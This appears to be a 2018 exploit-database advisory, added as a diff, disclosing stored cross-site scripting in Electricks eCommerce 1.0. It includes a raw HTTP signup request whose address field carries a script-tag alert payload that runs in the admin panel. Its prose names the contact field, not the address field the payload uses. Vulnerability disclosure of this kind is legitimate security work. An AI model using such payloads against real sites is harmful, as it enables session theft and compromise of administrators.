@@ -1,0 +1,36 @@
+# Exploit Title: Electricks eCommerce 1.0 - Cross-Site Scripting
+# Date: 2018-11-12
+# Exploit Author: Nawaf Alkeraithe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/_billyblue/electricks.zip
+# Version: 1.0
+
+When a user signs up for an account on the following url:
+Electricks-shop/pages/user_signup.php
+
+The contact info input field isn't validated before displaying it to the
+admin control panel page where the script will be executed.
+
+Admin Control Panel could be found here:
+/Electricks-shop/pages/admin_panel.php
+
+For testing you could register as an admin here:
+/Electricks-shop/pages/admin_signup.php
+
+POST /Electricks/Electricks/Electricks-shop/pages/user_signup.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/Electricks/Electricks/Electricks-shop/pages/user_signup.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 199
+Cookie: PHPSESSID=f7is0t729t957ec7hbfud4oe98
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+firstname=Nawaf&middlename=test&lastname=Alkeraithe&email=nalkeraithe%
+40gmail.com
+&address=%3Cscript%3Ealert%28%22Stored+XSS%22%29%3C%2Fscript%3E&contact=nawaf&username=testme&password=tesetme&submit=
